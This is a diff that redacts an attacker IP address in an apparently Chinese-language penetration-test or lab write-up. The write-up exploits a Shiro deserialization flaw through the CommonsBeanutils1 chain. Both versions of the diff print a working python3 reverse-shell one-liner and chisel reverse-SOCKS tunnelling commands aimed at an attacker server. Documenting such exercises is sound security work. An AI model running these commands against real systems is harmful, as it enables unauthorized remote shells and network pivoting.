@@ -86,7 +86,7 @@ algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES
 利用 CommonsBeanutils1 链子进行攻击，直接利用环境已有的 pytohn3 反弹 shell
 
 ```bash
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("8.129.29.180",9111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("8.***.***.180",9111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 ```
 
 成功收到回连
@@ -219,9 +219,9 @@ root@jmt-projekt:~# ./tools/chisel_1.10.1/chisel_1.10.1_linux_amd64 server -p 91
 2025/01/31 22:29:55 server: Listening on http://0.0.0.0:9111
 
 # target
-(remote) app@web01:/tmp$ ./chisel_1.10.1_linux_amd64 client 8.129.29.180:9111 R:0.0.0.0:10000:socks &
+(remote) app@web01:/tmp$ ./chisel_1.10.1_linux_amd64 client 8.***.***.180:9111 R:0.0.0.0:10000:socks &
 [1] 19534
-2025/01/31 22:30:40 client: Connecting to ws://8.129.29.180:9111
+2025/01/31 22:30:40 client: Connecting to ws://8.***.***.180:9111
 2025/01/31 22:30:40 client: Connected (Latency 51.577505ms)
 ```
 
